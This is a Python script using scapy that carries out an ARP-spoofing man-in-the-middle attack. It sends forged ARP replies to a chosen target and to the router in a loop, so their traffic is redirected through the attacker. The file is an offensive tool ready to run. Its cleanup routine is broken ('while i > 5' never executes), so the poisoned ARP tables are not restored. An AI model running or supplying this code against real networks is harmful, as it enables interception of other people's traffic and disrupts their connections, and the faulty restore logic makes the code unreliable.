#!/usr/bin/env python

import scapy.all as scapy
import argparse
# import subprocess
# import re
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target's IP")
    parser.add_argument("-r", "--router", dest="router", help="Router's IP")
    parser.add_argument("-i", "--interface", dest="interface", help="interface being used")

    (options) = parser.parse_args()

    if not options.target:
        print("[-] Missing the target's IP")

    if not options.router:
        print("[-] Missing the router's IP")
        # print("[+] router's IP wasn't entered, finding gateway IP")
        # options.router = router_ip_finder()

    if not options.interface:
        print("[+] Missing the interface, assuming wlan0")
        options.interface = "wlan0"

    return options


def get_target_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_request
    answered_list = scapy.srp(arp_req_broad, iface=interface, timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc


def spoof_packet_maker(dest_IP, spoofed_IP, interface):
    target_mac = get_target_mac(dest_IP, interface)
    packet = scapy.ARP(op=2, pdst=dest_IP, hwdst=target_mac, psrc=spoofed_IP)

    return packet


# def start_flow(i):
#    print("[+] Stated port forwarding")
#    subprocess.run("echo '1' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")


# def stop_flow(i):
#    print("[+] ending port forwarding")
#    subprocess.run("echo '0' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")


def spoofer(p_f_t, p_f_r, target_IP, router_IP, interface):

    print("[+] Spoofing has begin")
    packet_count = 0
    try:
        while True:
            scapy.send(p_f_t, iface=interface, verbose=False)
            scapy.send(p_f_r, iface=interface, verbose=False)
            packet_count = packet_count + 2
            print("\r[+] sent " + str(packet_count) + " packets", end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[-] Ctrl + C detected ... Quitting")
        restore(target_IP, router_IP, interface)


def restore(dest_IP, source_IP, interface):
    dest_mac = get_target_mac(dest_IP, interface)
    source_mac = get_target_mac(source_IP, interface)

    last_packet = scapy.ARP(op=2, pdst=dest_IP, hwdst=dest_mac, psrc=source_IP, hwsrc=source_mac)

    i = 0
    while i > 5:
        scapy.send(last_packet, iface=interface)
        i = i+1


def main():
    options = get_arguments()
    target_IP = options.target
    router_IP = options.router
    interface = options.interface

    packet_for_target = spoof_packet_maker(target_IP, router_IP, interface)
    packet_for_router = spoof_packet_maker(router_IP, target_IP, interface)

#    start_flow(interface)

    spoofer(packet_for_target, packet_for_router, target_IP, router_IP, interface)


main()
